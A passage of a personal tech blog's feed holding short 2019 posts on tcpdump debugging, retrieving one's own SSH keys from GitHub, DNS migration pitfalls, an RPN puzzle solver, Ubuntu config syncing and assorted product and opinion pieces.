<p>This was an extremely brute force attempt by treating each combination of numbers and operators as its own expression to be permuted. I didn’t worry about validation and instead just relied on evaluating and then ignoring the exceptions. The permutation step was incredibly simple to implement but as expected this was extremely inefficient and I was unable to actually get a solution in a reasonable amount of time. An example of an expression generated (invalid) with this approach was “1 + * 2 9 8 17 3 / - *” - it had the right numbers and operators but the RPN order was just invalid.</p>

<h3 id="attempt-4">Attempt 4</h3>

<p>This was simply validating the expressions generated in the third attempt to before running the evaluator. With RPN the approach is incredibly simple since all we need to do is read from left to right and make sure that the number of numbers seen is always greater than the number of operators. This is the current approach and actually results in a working solution in a reasonable amount of time. I tested it on a few problems that have 6 starting numbers and the solutions were all within the 5 to 10 minute range.</p>

<h3 id="future">Future</h3>

<p>There are some clear deficiencies with the previous approach. The major one is that why validate instead of generating the valid expressions at the beginning? The ideal approach would also do a fair amount of memoization to avoid having to recompute the same sub-expressions over and over. I expect that implementing these ideas will improve the speed by an order of magnitude.</p>

<p>If you’re interested in following along or building your own implementation it’s all available on GitHub: <a href="https://github.com/dangoldin/num-game-solver/blob/master/solve.py">https://github.com/dangoldin/num-game-solver/blob/master/solve.py</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>In praise of tcpdump</title>
   <link href="http://dangoldin.com/2019/09/13/in-praise-of-tcpdump/"/>
   <updated>2019-09-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/09/13/in-praise-of-tcpdump</id>
   <content:encoded><![CDATA[
<p>We switched over to Prometheus and Grafana for our monitoring but some of our older systems are still on Graphite and StatsD. One of these is an alert for disk usage that started going off a few weeks ago. Over the course of the day it kept fluctuating from 100% disk usage to ~40% and whenever we dug into it we only saw the 40% number. Since StatsD is push based we assumed it was another instance that was submitting its metrics under the same key. Unfortunately, because StatsD is push based, it wasn’t clear which instance was actually doing the conflicting metrics push.</p>

<p>After a few days of poking around we weren’t any closer to solving the problem and wished there was something on our StatsD instance that could track the source of every metric submission. That’s exactly what tcpdump does and after a bit of research we came up with the following command:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> eth0 udp port 8125 <span class="nt">-vv</span> <span class="nt">-X</span> <span class="o">&gt;</span> /tmp/tcpdump.tmp</code></pre></figure>

<p>This listens to all UDP traffic going into port 8125 and dumps it into a temp file. We kicked this off and after running it for a few hours we saw that there was, in fact, another instance sending this conflicting metric data. This led to a new problem as we were unable to find the instance in our account. After a bit of poking around, we discovered that we had a rogue instance in another account that was created while we were testing a provisioning script and was never deactivated. A relatively simple issue took us quite a bit of time to resolve and I’m not sure where we’d be without tcpdump.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Where's the new iPhone SE?</title>
   <link href="http://dangoldin.com/2019/09/12/wheres-the-new-iphone-se/"/>
   <updated>2019-09-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/09/12/wheres-the-new-iphone-se</id>
   <content:encoded><![CDATA[
<p>After the new iPhone announcement there’s been a bunch of commentary around the desire to come up with a new version of the SE, a smaller factor phone. Fred Wilson posted a <a href="https://avc.com/2019/09/bring-back-the-se/">short post</a> about it and it was quickly picked up and spread across various forums, such as <a href="https://news.ycombinator.com/item?id=20931512">Hacker News</a>. The discussions generally ranged around the market size and how it’s not just worth it but I suspect a big part is the hardware.</p>

<p>It may be incredibly difficult and expensive to pack the same performance into a much smaller form factor. The newly announced iPhone 11 is 5.94” tall, 2.98” wide, 0.33” deep, and weighs 6.48 ounces. The iPhone SE, on the other hand, is 4.86” tall, 2.31” wide, 0.30” deep, and weighs 3.99 ounces. The volume of an iPhone 11 is 5.84 cubic inches while the SE is 3.37 cubic inches, just over 40% smaller. That doesn’t even include the case or screen depth and it’s incredible to see how much technology is packed into such a small space but also shows how much much smaller the SE is.</p>

<p>I’m far from an expert and am just speculating but it can’t be that simple to reduce the volume of components by 40% and still expect the same functionality. It may be possible that they can pack the hardware in to the SE size from a few years ago but then the specs would be significantly worse than the flagship model. And why many people want the SE back how many of those would take specs that are a few years out of date? I would given that I’m still on a 6S but I’m not sure how many others would.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Getting public keys from GitHub</title>
   <link href="http://dangoldin.com/2019/08/27/getting-public-keys-from-github/"/>
   <updated>2019-08-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/08/27/getting-public-keys-from-github</id>
   <content:encoded><![CDATA[
<p>I use DigitalOcean to host a variety of personal projects and every once in a while go through a “DevOps” spree where I upgrade everything I can. Last time around I switched them over to Ansible to make these sorts of updates easier. I ran this playbook earlier this week and discovered that one of the instances had an outdated public key and I no longer had SSH access.</p>

<p>It would have been straightforward to go through the DigitalOcean flow of stopping the instance and launching it again with an updated key but I wanted to explore and see if I could find a way to avoid the reboot. After poking around the DigitalOcean UI I found a section that allowed to me to login to the terminal of the instance. I was somehow able to guess the password here (shows how secure my passwords are) but then ran into another problem: the paste command garbled the text as I was pasting it into the spoofed terminal. I tried a few alternatives but was unable to get public key added through the UI.</p>

<p>What I needed was a simple way to publicly host my keys and then download them using a curl command. I was about to upload them to a personal S3 bucket and then somehow remembered that you can get any GitHub user’s keys from a GitHub url: https://github.com/{user}.keys - my keys are available at https://github.com/dangoldin.keys. Fetching this file and dumping them into authorized_keys solved my problem and I was able to finish up the update. The lesson here is that 1) your GitHub public keys are publicly accessible via GitHub and 2) it’s useful to keep accumulating info since you don’t know when you’ll need it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Explain the why in code reviews</title>
   <link href="http://dangoldin.com/2019/08/25/explain-the-why-in-code-reviews/"/>
   <updated>2019-08-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/08/25/explain-the-why-in-code-reviews</id>
   <content:encoded><![CDATA[
<p>This may be obvious to most people but it’s still worth reiterating: if you’re leaving a comment on a code review make sure to explain your reasoning. Code reviews are a key component in writing high quality code, improving everyone’s skills and knowledge, and encouraging a strong and collaborative team.</p>

<p>Code reviews can be a bit clinical with feedback being blunt and a few words and it’s important to add context to all but the simplest of feedback. Experiences and backgrounds vary across the team and what’s obvious to one person may not be obvious to others. Similarly, it softens the feedback and encourages both sides to have a conversation. The act of describing the why also forces the reviewer to slow down and actually think about their reason for the change request. This may, in fact, reveal that the change request is not actually useful or may not actually have a good reason.</p>

<p>It’s an easy habit to develop and makes one a stronger contributor to the team. It will improve the way the feedback is received as well as encourage the reviewer to adopt a “<a href="https://en.wikipedia.org/wiki/Tabula_rasa">tabula rasa</a>” mindset and improve their code and thinking as well.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Disney+</title>
   <link href="http://dangoldin.com/2019/08/24/disney/"/>
   <updated>2019-08-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/08/24/disney</id>
   <content:encoded><![CDATA[
<p>Yesterday the internet blew up after Disney’s announcement of a new series, <a href="https://en.wikipedia.org/wiki/The_Mandalorian">The Mandalorian</a>, that would be available as a part of their new streaming service, Disney+. I watched the <a href="https://www.youtube.com/watch?v=aOC8E8z_ifw">trailer</a> and as expected it hit all the right Star Wars nostalgia points. The show itself wasn’t what stood out. Instead it was the closing scene where Disney highlights what Disney+ includes: Disney, Pixar, Marvel, Star Wars, and National Geographic.</p>

<img src="http://dangoldin.com/assets/static/images/disney-plus.png" alt="Disney+ ownership" width="1256" height="521" layout="responsive"/>

<p>People following the “streaming wars” know how many properties Disney owns but this is a shot to everyone else that Disney owns a ton of content. It’s an incredibly strong move and makes me more and more bullish about Disney and the Disney+ offering. I’d be shocked if they don’t quickly rise to the top ranking. It’s a bit difficult to pull up to date subscriber numbers by service but I found some data from April 2018 indicating that HBO is ahead of Netflix which is ahead of Amazon Prime. I don’t know what the latest numbers are but I can easily imagine Disney quickly competing with the top 3. I wouldn’t even be surprised if they surpass every other streaming service - they have content that runs the gamut and the price is more than fair. I currently own a small amount of Disney stock but to put my money where my mouth is I plan on purchasing more this week.</p>

<img src="http://dangoldin.com/assets/static/images/streaming-subscribers-april-2018.png" alt="Number of streaming subscribers as of April 2018" width="762" height="427" layout="responsive"/>
<p class="caption">Source: <a href="https://www.vox.com/2018/4/19/17257942/amazon-prime-100-million-subscribers-hulu-hbo-tinder-members">vox.com</a></p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>What do airlines and LinkedIn have in common?</title>
   <link href="http://dangoldin.com/2019/08/22/what-do-airlines-and-linkedin-have-in-common/"/>
   <updated>2019-08-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/08/22/what-do-airlines-and-linkedin-have-in-common</id>
   <content:encoded><![CDATA[
<p>Supposedly airlines could make the economy seats much better than they are without a significant investment but purposefully do not in order to encourage people that can afford business or first class to choose business or first class. Perversely, this makes sense. If economy is only slightly worse than business then I’d be willing to save quite a bit of money by choosing economy for a worse experience. Yet if the economy seats were significantly worse then I’d pay a premium for business. The art is in figuring out what that threshold should be to fill every seat.</p>

<p>I have recently been using the premium LinkedIn recruiter account and it feels the same way. It’s orders of magnitude better than recruiter lite and anyone that spends multiple hours a day sourcing would have to get the premium account to benefit. It’s a savvy move by LinkedIn but at the same time disappointing how much better the actual product can be. Before using the premium version I attributed the poor usability to the product to poor execution but after seeing how effective the premium version is I know the team is incredibly competent and it’s terrible for business reasons.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Yahoo fantasy football stats: 2019-2020 edition</title>
   <link href="http://dangoldin.com/2019/08/05/yahoo-fantasy-football-stats-2019-2020-edition/"/>
   <updated>2019-08-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/08/05/yahoo-fantasy-football-stats-2019-2020-edition</id>
   <content:encoded><![CDATA[
<p>In what has become an annual tradition I’ve updated my Yahoo Fantasy Football scraping script for the 2019-2020 NFL season. The script works by logging into the Yahoo Fantasy Football site and downloading the first 4 pages of projected stats for each week. The code is up on <a href="https://github.com/dangoldin/yahoo-ffl">GitHub</a> as well as the stats in a <a href="https://github.com/dangoldin/yahoo-ffl/blob/master/stats-2020.csv">CSV file</a>.</p>

<p>Every year there’s been something that Yahoo did to break my script and this year was no different. The first thing I discovered was the login broke despite the HTML elements staying the same - it turns out my login “click” event was actually clicking on an ad which was opening up a new window. Changing the code from a click to an enter solved that problem.</p>

<p>The next problem was that after a few pages the site would just hang and timeout. Digging into it I discovered that it was always timing out with a request to a subdomain of doubleverify.com, a digital fraud vendor. My suspicion is that since I was using Selenium to automate the scrape it was rightfully flagged as fraud and rather than bail it decided to just hang my process. Since DoubleVerify is also a tracking the company the fix here was to run Chrome with the <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en">uBlock Origin</a> extension enabled which required a bit of research to configure but ended up solving the problem.</p>

<p>I haven’t been defeated by Yahoo’s anti-scrape systems yet but there’s always next year.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Diablo on the web</title>
   <link href="http://dangoldin.com/2019/08/04/diablo-on-the-web/"/>
   <updated>2019-08-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/08/04/diablo-on-the-web</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/diablo.jpg" alt="Diablo game cover" width="400" height="300" layout="responsive"/>

<p>I spent more time than I should have playing the newly released JavaScript port of Diablo. I remember saving up to buy this game and poring over the manual for hours before actually being able to play it due to a single and shared family computer. Diablo was different than anything I had played before and I got hooked. It was also one of the first games I played that had online support. I never beat it without cheating but it was an incredible game to play and world to explore. It also led me to lose a chunk of my high school life to Diablo 2 but that’s another story.</p>

<p>It turns out that there’s a <a href="https://github.com/diasurgical/devilution">GitHub project</a> containing the code of the original game. It’s being maintained by a small team that was able to reverse engineer the compiled code based on some additional leaks. That is incredibly impressive but what makes it even more exciting is that someone took this version and <a href="https://github.com/d07RiV/diabloweb">ported it over</a> to WebAssembly which allows it to run in the browser.</p>

<p>Diablo was released in 1996 and it took 23 years to port it to the browser. It’s an incredible example of the power of open source. A small community was passionate enough to keep working on this project and release it to the broader world. I’m almost as happy now as I was 23 years ago when I first played it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Sports biographies as management books</title>
   <link href="http://dangoldin.com/2019/07/29/sports-biographies-as-management-books/"/>
   <updated>2019-07-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/29/sports-biographies-as-management-books</id>
   <content:encoded><![CDATA[
<p>If you know me, you’d know that I am not into watching sports and view being a fan as a waste of time. I understand why some people do it but it’s just not for me. At the same time, I’m a sucker for a good biography and really enjoy the biographies of coaches and players. Sports has a good balance of trying to improve as an individual while also competing for something as part of a team and sports biographies do a great job of walking that line.</p>

<p>These act as management advice and do it in a much more authentic way than yet another fluffy management book. Their purpose isn’t to teach and instead they’re written as an engaging story that provides an honest perspective instead of an over-analyzed and potentially hypothetical scenario.</p>

<p>Maybe I actually am into sports and but it’s manifested by me reading biographies.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Open sourcing configurations</title>
   <link href="http://dangoldin.com/2019/07/28/open-sourcing-configurations/"/>
   <updated>2019-07-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/28/open-sourcing-configurations</id>
   <content:encoded><![CDATA[
<p>Open source has been an incredible boon to software. It is the foundation of every modern startup and has allowed small teams to outbuild their larger rivals. As critical as open source software is I wish there was a single repository containing production deployment stats and configurations. For example, if you look at the <a href="https://kafka.apache.org/documentation/#configuration">Kafka documentation</a> you quickly discover there are hundreds of options that can be set. Some matter more than others but it’s a larger undertaking to properly configure a cluster and understand the impact each of these configuration options will have.</p>

<p>Instead, imagine having a quickly searchable repository of production configurations sourced from a variety of companies running a variety of different clusters across a variety of different platforms and providers. For someone who only has a journeyman understanding this would be an incredible tool. They’d be able to use their existing cluster statistics to find a set of comparable deployments and then compare configurations. This would provide much needed guidance to those starting out and would lead to more efficient and secure deployments.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>GitHub blocks access from Iran</title>
   <link href="http://dangoldin.com/2019/07/27/github-blocks-access-from-iran/"/>
   <updated>2019-07-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/27/github-blocks-access-from-iran</id>
   <content:encoded><![CDATA[
<p>Earlier today GitHub <a href="https://www.businessinsider.com/microsoft-owned-github-reportedly-blocking-people-in-crimea-iran-sanction-2019-7">blocked access</a> from Iran citing sanctions. Sanctions have a time and place but make very little sense when it comes to GitHub. The entire idea of GitHub is to spread open source which aligns closely with democratic ideals and principles. It’s one thing to hurt a country economically to drive change but a whole other to prevent their population from accessing information.</p>

<p>Totalitarian countries want to control access to information and the way to fight that is to make it as easy as possible to make it available and this move is the exact opposite of what should happen. GitHub does an incredible job of making information accessible and that should be encouraged. Major changes come from people pushing back against existing authority and they need to have hope to do so. Providing a glimpse of another world is how we do that and it’s disappointing that this avenue is being shut down.</p>

<p>I’m not oblivious to the fact that GitHub is only relevant for technologists but I worry about the approach we’re taking and the signals it’s sending.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>PagerDuty's incident response guide</title>
   <link href="http://dangoldin.com/2019/07/26/pagerdutys-incident-response-guide/"/>
   <updated>2019-07-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/26/pagerdutys-incident-response-guide</id>
   <content:encoded><![CDATA[
<p>As companies grow they need to develop their incident response processes. The risks are greater and the systems become increasingly more complicated with significantly more specialized knowledge. We’re going through a process to redo our incident response process and while doing research I came across <a href="https://response.pagerduty.com">PagerDuty’s guide</a> which has been incredibly helpful in guiding our approach.</p>

<p>It’s extremely thorough and goes into painstaking detail that describes everything one needs to do to build a mature incident response process. There’s a slew of content around setting up the tools (using PagerDuty of course) but also around the cultural and organization pieces that need to be there to make it a success.</p>

<p>Redoing an incident response process is a big undertaking and the PagerDuty guide make it a lot more tractable. Even if you’re happy with your current approach it’s definitely worth a read just for the sheer amount of content and information.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A more efficient Google Calendar</title>
   <link href="http://dangoldin.com/2019/07/21/a-more-efficient-google-calendar/"/>
   <updated>2019-07-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/21/a-more-efficient-google-calendar</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/new-gcal-event-creation.png" alt="New Google Calendar event creation" width="451" height="394" layout="responsive"/>

<p>Google Calendar is starting to become one of my favorite Google products. They’re constantly shipping new features that keep on making it easier and more efficient to use. One of the most recent improvements is the ability to create a fully featured event directly from the calendar screen. One of my biggest use cases is to schedule a meeting with someone which requires knowing both their availability and the availability of a room. In the past, this required going into the full screen edit page which caused a bit of friction. Earlier this week while creating an event from the calendar page I was able to also enter a name and see their schedules appear on the calendar. Similarly, there’s a room field that also offers suggestions for free rooms with the desired capacity.</p>

<p>The improvements aren’t radical but highlight that the team is still taking their work seriously and looking to improve an already mature and stable product. It really does feel as if the <a href="http://dangoldin.com/2018/08/15/google-calendar-constantly-shipping/">pace of improvements</a> to Google Calendar have improved over the past year.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why is your Confluence in Polish?</title>
   <link href="http://dangoldin.com/2019/07/19/why-is-your-confluence-in-polish/"/>
   <updated>2019-07-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/19/why-is-your-confluence-in-polish</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/confluence-date-lozenge.png" alt="Confluence Date Lozenge settings" width="634" height="257" layout="responsive"/>

<p>Despite not speaking any Polish, I changed my Confluence language to Polish earlier this week to finally fix a problem that’s been bugging me for years. Confluence has the concept of a “<a href="https://confluence.atlassian.com/doc/configuring-time-and-date-formats-150144.html">date lozenge</a>” which allows you to add a date via a helpful calendar and gives it a nice looking format. We decided to use these lozenges to track dates in our system since it improves consistency and they do get special treatment in Confluence and lead to a few neat features - for example being able to use them as due dates in tasks.</p>

<p>Unfortunately, the default English settings have them formatted as “dd mmm YYYY” so June 5, 2019 would be displayed as “05 Jun 2019”. In isolation this is fine but it causes a big pain if you want to sort by a date in a table since, as you can probably guess at this point, it sorts by the day of the month, then the month string, and then the year. In essence, it doesn’t actually treat it as a date and instead sorts them as if they were all strings.</p>

<p>This is not very helpful when you have a list of documents and want to see the most recent ones first. Luckily, after poking around, I realized that Confluence had a date format that I assumed would change the lozenge formatting. Unfortunately, this only changed the formatting of internal dates - for example document data.</p>

<p>It turns out that the only way to change the format of the “date lozenge” is to change language settings. And in order to get something that’s year, month, and then date I get to pick out of either Polish or Japanese.</p>

<p>I’ve used Confluence enough that I can navigate it by feel so the Polish doesn’t bother me too much but it is ridiculous that there’s no way to actually change the format of the date lozenge without changing your language setting and that sorting date objects sorts based on the date format. If either of these worked as expected my Confluence would still be in English but then I wouldn’t be improving my language skills.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Substack vs Medium</title>
   <link href="http://dangoldin.com/2019/07/17/substack-vs-medium/"/>
   <updated>2019-07-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/17/substack-vs-medium</id>
   <content:encoded><![CDATA[
<p>I heard about Substack for the first time today while reading the <a href="https://stratechery.com/2019/substack-raises-series-a-an-interview-with-substack-co-founders-christopher-best-and-hamish-mckenzie/">Stratechery newsletter</a>. For those not familiar (like me before today!), Substack is a startup that makes it easier for individual content creators to create and monetize newsletters with the goal of empowering them to build their own media empires.</p>

<p>As I read the article I couldn’t help but think about the struggles Medium has had since its founding. It started as a blogging platform and had a variety of challenges with monetization over the years. At one point they had advertising but <a href="https://digiday.com/media/medium-gives-ad-sales-calling-system-broken/">gave up</a> on it in 2017. Since then they’ve shifted to a subscription model where once you hit a limit some articles end up being put up behind a paywall, very similar to a traditional publisher. I don’t know how Medium is doing but I doubt this is where they wanted to be - monetizing in the same way as the NY Times.</p>

<p>They’re very different businesses and the jury is still out on Substack but it seems this was a lost opportunity by Medium. They focused so much on the content and growing the Medium brand as a destination that they didn’t invest in improving the lives of content creators who are the bread and butter of the platform. Conversely, Substack didn’t focus on building a consumer audience and instead focused on getting high quality authors to start newsletters and gave them all the tools to do it efficiently and safely.</p>

<p>It may be nothing or me overanalyzing but this feels like a healthy change in the attitude of startups. Rather than focus on growing consumer attention at all costs they’re slowing down, thinking about monetization early, and investigating in the drivers of their business. There are likely many similar opportunities out there - find startups that are trying to aggregate attention and then build services for their cream of the crop suppliers.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Cloudflare outage postmortem</title>
   <link href="http://dangoldin.com/2019/07/16/cloudflare-outage-postmortem/"/>
   <updated>2019-07-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/16/cloudflare-outage-postmortem</id>
   <content:encoded><![CDATA[
<p>Postmortems are one of the best practices of modern software engineering. They allow engineering teams to learn from mistakes and drive changes that eliminate entire categories of problems. They’re a great way to own issues, and if shared publicly, provide transparency to customers and describe what will be done to prevent these types of issues in the future.</p>

<p>As an engineer, it’s incredibly valuable and interesting to read these public postmortems. When large companies are hit with an issue that requires a postmortem it’s usually a gnarly issue that is inspiring and interesting to learn about. In addition, they offer a glimpse into how larger companies operate, the way their teams are organized, and the types of tools and systems they have to address issues. These are all very helpful to those of us who are running at a much smaller scale since they force us to compare and contrast our systems against theirs and helpfully allow us to improve the way we operate.</p>

<p>One of the best postmortems I’ve read recently was <a href="https://new.blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/">published by Cloudflare</a>; they had an outage on July 2nd and wrote a deep and thoughtful postmortem that explained the issue in depth and the changes being made to avoid something similar in the future. If you haven’t had a chance to read it yet definitely take the time.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Environmental sustainability</title>
   <link href="http://dangoldin.com/2019/07/15/environmental-sustainability/"/>
   <updated>2019-07-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/15/environmental-sustainability</id>
   <content:encoded><![CDATA[
<p>Lately I’ve been much more aware of how much waste we generate and wish there was a way to not just recycle but instead to reuse. There’s so much we consume that recycling only gets us so far and it’s much better to reuse as much as possible. How much better off would we all be if we were able to reuse existing containers for takeout and food delivery? It is an inconvenience but it’s much more sustainable and as a society we’d get used to it.</p>

<p>The culture of consumerism makes things worse and it’s incredible how much waste goes into packaging. While doing some research I came across <a href="https://packagefreeshop.com">Package Free</a> and think it’s a fantastic idea. The premise is to still ship but do it in much more environmentally friendly ways. There’s no need for clamshell or plastic intensive packaging.</p>

<p>Some day the world will adopt a much greener lifestyle but until then we must all do what we can to act just a bit greener.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Toward a global government</title>
   <link href="http://dangoldin.com/2019/07/14/toward-a-global-government/"/>
   <updated>2019-07-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/14/toward-a-global-government</id>
   <content:encoded><![CDATA[
<p>The world isn’t in the best shape these days. There’s a rise in extreme nationalism and intolerance, climate change is leading to some wild weather, and overall it just feels we’re moving in the wrong direction. Everyone can speculate on the causes but to me it’s a function of the complicated, and often, antithetical incentives from the various global players. Each country is looking out for its own interests and despite their behavior having an impact on others. This leads to a “<a href="https://en.wikipedia.org/wiki/Tragedy_of_the_commons">tragedy of the commons</a>” situation where the earth is being abused. The world’s institutions are just not strong enough to support the policies the world needs.</p>

<p>Tens of thousands of years ago the organizational unit was a small tribe that was largely nomadic. Once humanity discovered farming humans became sedentary and led to the rise of the village. Once there were enough villages they became cities and then city-states. These then gave rise to countries.</p>

<p>This is a gross simplification that I’m sure will anger historians and anthropologists but humanity came up with the appropriate structure at the appropriate time. Cities didn’t make sense until there was enough infrastructure, both administrative and agricultural, to support them. Countries didn’t make sense until it was possible to govern massive areas. And we’re soon approaching the need for a global solution.</p>

<p>The trend is to move towards larger and larger units and we’ll inevitably end up with some form of global government. We already have the United Nations but it doesn’t have the power to set or enforce global policy. It may be that it evolves to have this additional power or it may be that the future is more of a EU model that grows as more and more countries join. It’s impossible to tell when this will happen but it feels inevitable given the scope and impact of today’s problems.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My Ubuntu experinece</title>
   <link href="http://dangoldin.com/2019/07/14/my-ubuntu-experinece/"/>
   <updated>2019-07-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/14/my-ubuntu-experinece</id>
   <content:encoded><![CDATA[
<p>At the end of 2018 I made the shift from OS X on a Macbook Pro to Ubuntu on a Thinkpad and it’s been enough time for me to get used to the new setup while still remember the old one so I thought I’d share my experiences.</p>

<p><strong>The good</strong></p>

<p>Installing packages is much easier and requires no weird workarounds. The built-in package manager is a big boost and nearly every library or utility I need can be installed with a simple “apt install” call. As expected, there’s a lot more customization you can do than on OS X. Nearly everything can be tweaked and modified - ranging from shortcuts in different apps to various system settings to get the optimal configuration. Developing feels similar to OS X in terms of IDEs but it does feel a little bit snappier and the environment is much closer to where it will actually be deployed.</p>

<p><strong>The bad</strong></p>

<p>One of the things I miss most is Excel. There’s LibreOffice and Google Spreadsheets and they’re alright for viewing spreadsheets but impossible to work with as a power user. Excel on OS X is not as good as it is on Windows but at least I have that option. There’s always the option of running Excel in a virtualized Windows environment but I stayed away from that for now.</p>

<p>There’s also the expected lack of usability around the edges. For the most part things work but there are some annoyances I discovered - for example some applications close with a Ctrl+W while others require a Ctrl+Q. Similarly, some of the functionality is a bit wonky. I got a VPN working but as soon as I’d disconnect from the VPN I’d lose name resolution. The fix was to use <a href="http://www.thekelleys.org.uk/dnsmasq/doc.html">dnsmasq</a> but I wish it worked out of the box.</p>

<p><strong>The ugly</strong></p>

<p>Ubuntu is just not as stable as OS X. This may be a function of the hardware but I used to be able to run OS X for months without a reboot and it’s rare that I can go a week without one. It’s somewhat surprising since so much of the modern internet runs on top of Linux but it’s just rare for my computer to go a week without seizing or slowing to a crawl. There were a few cases where my computer went into “read-only mode” and required an fsck (file system consistency check) to become healthy again. I’m running stock Ubuntu with minimal tweaks and it’s surprising how often it crashes. I’ve read that the Thinkpad hardware is just not suited for Ubuntu but then why does Windows not have the same problems?</p>

<p>Despite the challenges I’m still a convert and feel good using open source software. It comes with everything I need to do to my job and while I wish it was a bit more polished and stable I’m not going back to OS X any time soon.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>DNS resolution gotchas</title>
   <link href="http://dangoldin.com/2019/07/14/dns-resolution-gotchas/"/>
   <updated>2019-07-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/14/dns-resolution-gotchas</id>
   <content:encoded><![CDATA[
<p>A few months ago we ran a pretty complex migration from AWS Route 53 to NS1 and ran into a few gotchas that I wanted to share. On the surface, DNS seems simple: you associate subdomains to specific records and then rely on the DNS provider to handle that resolution.</p>

<p>The nuance occurs when you have a deeper structure where it takes a few steps to get to the final IP address. This is fairly common if you want to do DNS resolution based on the geography of the user. As an example, if I have a single site, www.dangoldin.com, I can use AWS Route 53 to create multiple records, each for a specific geographic region containing dedicated servers. In this case, I can set it up so that users from Europe end up with the record www-eu.dangoldin.com while users in North America end up with www-na.dangoldin.com. It’s still up to me to then have another resolution to map these regional records to the final locations but this allows the DNS resolution to be a bit more granular.</p>

<p>The trap we fell into was assuming that the resolution would be sticky. We thought that if Route53 was going to be used for the original lookup (www.dangoldin.com) we did not have to worry about NS1 being used for subsequent lookups. This was true most of the time but unfortunately not all the time. As part of the migrations we made some optimizations in our record hierarchy which caused the two systems to have a differing set of records. They were internally consistent but if some resolutions bled from Route53 to NS1 and vice versa they would end up unresolved.</p>

<p>Using the previous example (www.dangoldin.com), imagine we had www-na and www-eu in Route53 but decided to split www-na into www-useast and www-uswest in NS1. The problem would occur if the first request was to Route53 which would resolve with www-na but the second request tried to resolve www-na in NS1 since that record was not present. The same thing would have happened if we tried to resolve www-useast or www-uswest in Route53.</p>

<p>This was a gnarly problem and difficult to diagnose and catch since the issue manifested itself before the request even made it to our servers. In fact, we caught it by noticing that our traffic was lower than expected.</p>

<p>The takeaway here is that DNS is incredibly important, difficult to test and monitor, and if you ever switch your DNS providers to keep them in alignment until you’re sure all of the traffic has shifted over.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Keeping Ubuntu computers in sync</title>
   <link href="http://dangoldin.com/2019/07/13/keeping-ubuntu-computers-in-sync/"/>
   <updated>2019-07-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/13/keeping-ubuntu-computers-in-sync</id>
   <content:encoded><![CDATA[
<p>I switched to Ubuntu a few years ago and along with the change decided to keep as much of my environment setup in version control as possible. The motivation was to make the process of setting up a new computer as simple and repeatable as possible since I planned on shifting both my personal and work computers to Ubuntu and wanted to keep them in sync as much as possible.</p>

<table>
  <tbody>
    <tr>
      <td>The two primary things I wanted to take care of was to keep my applications and config files in sync between the two systems. The first I was able to do partially. I found a single command that captured everything installed via apt (pkg -l</td>
      <td>grep ^ii</td>
      <td>awk ‘{print $2}’) and then saved into a file that’s kept in version control. These can then be installed again using another command that just pipes the list into apt-get: apt-get install $(grep -vE “^\s*#” filename</td>
      <td>tr “\n” “ “). There are still some issues I need to handle around custom repositories but it generally works well.</td>
    </tr>
  </tbody>
</table>

<p>To handle configs I settled on using symbolic links. I keep all my key config files in the same git repo and then just symbolic link them to the appropriate place. For example, I use <a href="https://github.com/robbyrussell/oh-my-zsh">Oh My Zsh</a> and have my own .zshrc file that I link to my root directory by doing “ln -s ~/code/dev-ops/config/.zshrc .zshrc”</p>

<p>This approach definitely has room for improvement but it’s simple and lightweight and gets me most of the way to what I need.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Personal dashboards</title>
   <link href="http://dangoldin.com/2019/07/10/personal-dashboards/"/>
   <updated>2019-07-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/10/personal-dashboards</id>
   <content:encoded><![CDATA[
